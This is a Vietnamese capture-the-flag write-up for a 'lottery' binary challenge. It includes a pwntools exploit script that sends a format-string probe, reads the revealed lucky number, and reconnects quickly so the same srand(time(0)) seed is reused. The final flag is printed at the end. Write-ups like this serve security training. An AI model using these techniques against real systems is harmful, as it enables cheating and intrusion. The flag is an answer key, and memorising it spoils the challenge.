**SOLUTION**

hmmm....Bài này lúc đầu mình cũng thấy khá là ngô khoai.

Đầu tiên nó sẽ yêu cầu mình nhập tên với độ dài bằng 10 thông qua hàm:
```sh
fgets(name,10,stdin);
```

Sau đó nó sẽ in ra Hello + name vừa nhập và yêu cầu người chơi nhập 1 số bất kỳ, nếu trùng với số được cộng từ 2 số random của hệ thống thì mình sẽ lấy được flag.

Vấn đề này thì đơn giản hơn nhiều khi chương trình có sử dụng hàm `srand(0)` nhưng ở đây chương trình này sử dụng `srand(time(0))` để gọi 1 số random nên sẽ hơi khó 1 tí.

Vì mình không thể đoán chính xác số ấy được, nên mình sẽ cần leak số ấy ra thôi. Nhưng tiếc là mình hem leak được :((

Vậy thôi,.... mình chơi ăn gian 1 tí. Mình sẽ nhập đại 1 giá trị, sau đó mình bắt giá trị của server in ra sau câu `The lucky number is` để làm giá trị cho lần kết nối sau. Nhưng do mình làm tự động bằng file nên thời gian ko chênh lệch nhiều nên srand(time(0)) của 2 lần sẽ ko thay đổi. Mình nghĩ như vậy. Và xem nào, nó dùng được này....

Đây là file exploit.py của mình

```sh
from pwn import *
temp1 = "1111111"
#s = remote("128.199.234.122",4200)
s = process("./lottery")
s.sendline("%7$x")
s.recvuntil("Hello")
temp = s.recvline()
log.info(">> {}".format(temp))
s.sendline(temp1)
s.recvuntil("The lucky number is")
temp1 = s.recvuntil("\n")
log.info("Value >> {}".format(temp1))
#s =remote("128.199.234.122",4200)
s = process("./lottery")
s.sendline("Hazir")
s.sendline(temp1)
s.interactive()
s.close()
```

Run và hồi hộp chờ thôi nèo... Tadaaaaa 

**FLAG**

`efiensctf{ULTRA_MEGA_SUPER_HUGE_VIETLOT_JACKPOT}`